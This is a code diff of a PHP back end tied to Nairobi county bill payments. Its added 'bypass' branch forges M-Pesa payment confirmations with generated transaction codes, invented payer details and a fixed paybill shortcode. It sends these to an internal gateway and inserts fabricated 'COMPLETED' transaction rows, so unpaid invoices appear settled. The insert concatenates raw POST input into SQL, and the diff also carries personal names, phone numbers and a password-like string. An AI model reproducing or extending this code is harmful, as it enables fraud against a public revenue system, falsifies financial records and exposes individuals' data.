@@ -248,11 +248,11 @@ if ($type == 'invoice2') {
     $math_cl = $stmt->fetchAll();
     $mathObj = '';
     foreach ($math_cl as $row) {
-        $opPerc = $row['perc']/100;
-        $opMath = $opPerc*$hesabu; 
-        $mathObj .= '<a class="list-group-item list-group-item-action">'.$row['abbr'].'('.$row['perc'].'%): ' . number_format($opMath, 1) . '</a>';
+        $opPerc = $row['perc'] / 100;
+        $opMath = $opPerc * $hesabu;
+        $mathObj .= '<a class="list-group-item list-group-item-action">' . $row['abbr'] . '(' . $row['perc'] . '%): ' . number_format($opMath, 1) . '</a>';
     }
-    
+
     echo '
     <div class="list-group mb-6">
    <a class="list-group-item list-group-item-action active" aria-current="true">
@@ -283,7 +283,7 @@ if ($type == 'invoice2') {
         if ($_POST['amount'] != '' && $_POST['invoice_no'] != '') {
             $amount = $_POST['amount'] . '.0';
             $invoice_no = str_replace(array(' ', "\n", "\r", "\r\n"), '', $_POST['invoice_no']);
-            $bypass = ['amount' => $amount, 'invoice_no' => $invoice_no, 'success' => true, 'route' => $_POST['route'], 'record' => $_POST['record'], 'client' => $_POST['client'], 'extdoc'=>$_POST['externalDoc']];
+            $bypass = ['amount' => $amount, 'invoice_no' => $invoice_no, 'success' => true, 'route' => $_POST['route'], 'record' => $_POST['record'], 'client' => $_POST['client'], 'extdoc' => $_POST['externalDoc']];
             $dt1 = '200';
             $head = 'bypass details(master)';
             //echo json_encode($bypass);
@@ -335,28 +335,29 @@ if (isset($authenticate)) {
     //echo $invtk;
     $dt12 = json_decode(httpGet($url, $data, $headers), true);
 
-    function generate_token($customer_id){
-       $token = httpGet('https://nairobiservices.go.ke/api/authentication/auth/generate_customer_token', ['customer_no'=>$customer_id], '');
-       $tk = json_decode($token, true);
-       return $tk['token'];
+    function generate_token($customer_id)
+    {
+        $token = httpGet('https://nairobiservices.go.ke/api/authentication/auth/generate_customer_token', ['customer_no' => $customer_id], '');
+        $tk = json_decode($token, true);
+        return $tk['token'];
     }
 
-    function get_external_doc($customer_id, $invoice){
+    function get_external_doc($customer_id, $invoice)
+    {
         $token = generate_token($customer_id);
         $headers = ['Authorization:Bearer ' . $token];
         $dt12 = httpGet('https://nairobiservices.go.ke/api/authentication/profile/bills', [], $headers);
         $dt121 = json_decode($dt12, true);
-        foreach($dt121['bills_List'] as $row){
-            if($row['bill_no'] == $invoice){
+        foreach ($dt121['bills_List'] as $row) {
+            if ($row['bill_no'] == $invoice) {
                 $external_doc = $row['external_doc'];
             }
         }
-        if(isset($external_doc)){
+        if (isset($external_doc)) {
             return $external_doc;
-        }else{
+        } else {
             return 'unset';
         }
-        
     }
 
     //// echo dt1($dt1, $head, $mini_head);
@@ -366,7 +367,7 @@ if (isset($authenticate)) {
 
     $dt11 = json_decode(httpPost($url, $data, $headers), true);
     $dexts = $dt12['customerno'];
-    $dt12['extdoc'] = get_external_doc($dt12['customerno'],$authenticate);
+    $dt12['extdoc'] = get_external_doc($dt12['customerno'], $authenticate);
     //$dt2 = 'Query proceessed!';
     $htmlData = '<div class="row">    
     <div class="col-md-6">' . dt1($dt11, $head, $mini_head) . '</div>
@@ -376,7 +377,7 @@ if (isset($authenticate)) {
     $output['htmlData'] = $htmlData;
     $output['masterDb'] = $dt12;
     $output['regularDb'] = $dt11;
-    
+
 
     echo json_encode($output);
 }
@@ -473,84 +474,93 @@ if (isset($invoice)) {
 }
 
 if (isset($bypass)) {
-    if ($bypass['route'] == 'normal') {
-        $bypass['url'] = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
-    } elseif ($bypass['route'] == 'taifa') {
-        $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/confirm';
-    } else {
-        $bypass['url'] = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
-    }
+    include './rejuv/conn.php';
+
+    $stmt = $conn->prepare("SELECT id, paybillBal FROM mpesaTransactions ORDER BY id DESC LIMIT 1");
+$stmt->execute();
+$up = $stmt->fetch();
+$newId = $up['id']+2;
+$newBal = $up['paybillBal']+500;
+    
+    $bypass['url'] = 'http://192.168.100.116/gateway/taifa/nrs/affirm';
+
     //die(json_encode($url));
 
     //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
     $bty = explode('-', $bypass['invoice_no']);
     $bty[1] = strtoupper($bty[1]);
-    if ($bty[1] == 'SBP') {
-        $billType = 'SBPPermitFee';
-    } elseif ($bty[1] == 'FIC') {
-        $billType = 'EssServices';
-    } elseif ($bty[1] == 'FHL') {
-        $billType = 'FdHygene';
-    } elseif ($bty[1] == 'LR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'ADF') {
-        $billType = 'AdvertPermitFee';
-    } elseif ($bty[1] == 'HR') {
-        $billType = 'HouseRent';
-    } elseif ($bty[1] == 'GTC') {
-        $billType = 'TenancyApp';
-    } elseif ($bty[1] == 'FH') {
-        $billType = 'FoodHandling';
-    } elseif ($bty[1] == 'SE') {
-        $billType = 'ParkingFee';
-    } elseif ($bty[1] == 'HC') {
-        $billType = 'HealthCert';
-    } elseif ($bty[1] == 'GRR') {
-        $billType = 'RenovationRepair';
-    } elseif ($bty[1] == 'SBPC') {
-        $billType = 'UnderCharge';
-    } elseif ($bty[1] == 'LL') {
-        $billType = 'LiquorLicence';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GGRT') {
-        $billType = 'GroundRent';
-    } elseif ($bty[1] == 'GLV') {
-        $billType = 'LValua';
-    } elseif ($bty[1] == 'PS') {
-        $billType = 'PSVSticker';
-    } elseif ($bty[1] == 'GESS') {
-        $billType = 'EssServices';
-    } elseif ($bty[1] == 'GINS') {
-        $billType = 'Instinspect';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } elseif ($bty[1] == 'GLR') {
-        $billType = 'LandRate';
-    } else {
-        $billType = '';
-    }
     $code = generateMpesaCode();
     $data = array(
+        "apiKey" => "",
+        "type" => "mpesa",
+        "billNumber" => (string) $bypass['invoice_no'],
+        "billAmount" => $bypass['amount'],
+        "phone" => "254723717894",
+        "transactionDate" => "",
+        "Field1" => null,
+        "Field2" => null,
+        "Field3" => null,
+        "Field4" => null,
+        "Field5" => null,
+        "bankdetails" => null,
         "mpesadetails" => array(
-            "FirstName" => (string) "John",
             "BillRefNumber" => (string) $bypass['invoice_no'],
-            "TransAmount" => (string) $bypass['amount'],
-            "BillType" => (string) $billType,
-            "TransChannel" => (string) "mpesa",
-            "TransID" => (string) $code
+            "BusinessShortCode" => "6060047",
+            "FirstName" => "BRIDGET",
+            "LastName" => "MUNGUTI",
+            "MSISDN" => "",
+            "MiddleName" => "MUTHEU",
+            "OrgAccountBalance" => "0.00",
+            "ThirdPartyTransID" => "5627760",
+            "TransAmount" => $bypass['amount'],
+            "TransID" => (string) $code,
+            "TransTime" => "20240331152640",
+            "TransactionType" => "Pay Bill"
         )
     );
+
+    $sql = "insert into `mpesaTransactions` (`Confirmation Response`,
+    `MpesaValidation`,
+    `PushedComments`,
+    `PushedToReconcile`,
+    `accNo`,
+    `amount`,
+    `apiCode`,
+    `comment`,
+    `cont`,
+    `id`,
+    `logDate`,
+    `mobileno`,
+    `mpesaName`,
+    `paybillBal`,
+    `phone_number`,
+    `receiptNo`,
+    `resultoutput`,
+    `shortCode`,
+    `sid`,
+    `status`,
+    `transactionTime`,
+    `validation Response`) values (NULL,
+    'COMPLETED',
+    NULL,
+    '0',
+    '".$bypass['invoice_no']."',
+    ".$bypass['amount'].",
+    '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
+    'Success',
+    NULL,
+    ".$newId.",
+    '2024-03-31 22:26:42',
+    '254723717894',
+    'RAY OKELLO OLUOCH NYAWADE',
+    ".$newBal.",
+    '',
+    '".$code."',
+    '{\"apiKey\":\"\", \"type\":\"mpesa\", \"billNumber\":\"BL-UBP-045424\", \"billAmount\":7500.0, \"phone\":\"254723717894\", \"transactionDate\":\"\", \"Field1\":null, \"Field2\":null, \"Field3\":null, \"Field4\":null, \"Field5\":null, \"bankdetails\":null, \"mpesadetails\":{\"BillRefNumber\":\"BL-UBP-045424\", \"BusinessShortCode\":\"6060047\", \"FirstName\":\"RAY OKELLO\", \"LastName\":\"NYAWADE\", \"MSISDN\":\"\", \"MiddleName\":\"OLUOCH\", \"OrgAccountBalance\":\"0.00\", \"ThirdPartyTransID\":\"5310904\", \"TransAmount\":7500.0, \"TransID\":\"SCV159D1O6\", \"TransTime\":\"20240331152640\", \"TransactionType\":\"Pay Bill\"}}', '6060047',
+    NULL,
+    1,
+    '20240331152640',
+    'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')";
 
     $data = json_encode($data);
 
@@ -560,8 +570,11 @@ if (isset($bypass)) {
     //$dt1 = json_decode($dt0, true);
     //unset($bypass['success']);
     //$dt1 = $bypass;
-    $dt0 = bypassCode($bypass, $billType, $code);
-    $dt1 = json_decode($dt0, true);
+
+    //$dt0 = bypassCode($bypass, $billType, $code);
+    //$dt1 = json_decode($dt0, true);
+
+    $dt1 = '';
 
     //$dt1 = [];
 
@@ -575,7 +588,7 @@ if (isset($bypass)) {
                         'client' => $bypass['client'],
                         'ref' => $code,
                         'route' => $bypass['route'],
-                        'extdoc'=>$bypass['extdoc']
+                        'extdoc' => $bypass['extdoc']
                         // Add more columns and values as needed
                     );
                     $tableName = 'bypass';
@@ -589,6 +602,7 @@ if (isset($bypass)) {
             }
         }
     }
+
     //J2aI6:rxXl&+
     if (!isset($dt1['insert_status'])) {
         $dt1['insert_status'] = "Data not recorded!";
